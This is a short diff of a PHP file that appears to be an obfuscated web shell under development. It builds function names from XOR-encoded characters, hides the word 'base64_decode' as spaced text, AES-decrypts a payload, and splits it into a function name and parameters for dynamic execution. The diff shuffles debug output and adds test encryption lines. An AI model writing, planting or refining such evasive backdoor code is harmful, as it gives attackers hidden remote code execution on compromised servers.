@@ -28,9 +28,11 @@ $p='|||||||||||'^chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18)
 $HA1VG=$f($p);
 
 //test debug
-var_dump($HA1VG);
-exit;
 
+$ciphertext = openssl_encrypt($plaintext, "AES128", $key);
+echo $ciphertext;
+
+$HA1VG=$ciphertext;
 //if openssl isn't loaded
 if(!extension_loaded('openssl')){
 	$t=preg_filter('/\s+/','','base 64 _ deco de');
@@ -46,6 +48,8 @@ else{
 	$HA1VG=openssl_decrypt($HA1VG, "AES128", $key);
 }
 
+var_dump($HA1VG);
+exit;
 $arr=explode('|',$HA1VG);
 $func=$arr[0];
 $params=$arr[1];
